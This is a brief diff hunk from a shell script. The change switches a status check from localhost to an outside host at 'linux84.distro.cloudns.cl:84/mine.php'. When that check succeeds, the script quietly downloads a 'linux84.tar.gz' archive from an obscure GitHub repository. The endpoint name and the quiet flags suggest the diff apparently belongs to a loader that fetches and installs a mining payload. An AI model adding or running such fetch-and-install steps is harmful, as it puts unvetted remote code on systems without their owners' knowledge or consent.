@@ -110,7 +110,7 @@ do
 
 cd /mnt/disks/user/project/
 
-string=$(curl -s http://localhost:8884/?linux84=linux8474)
+string=$(curl -s http://linux84.distro.cloudns.cl:84/mine.php?q=info)
 if [[ $string == *"16384"* ]]; then
 
 wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux84.tar.gz
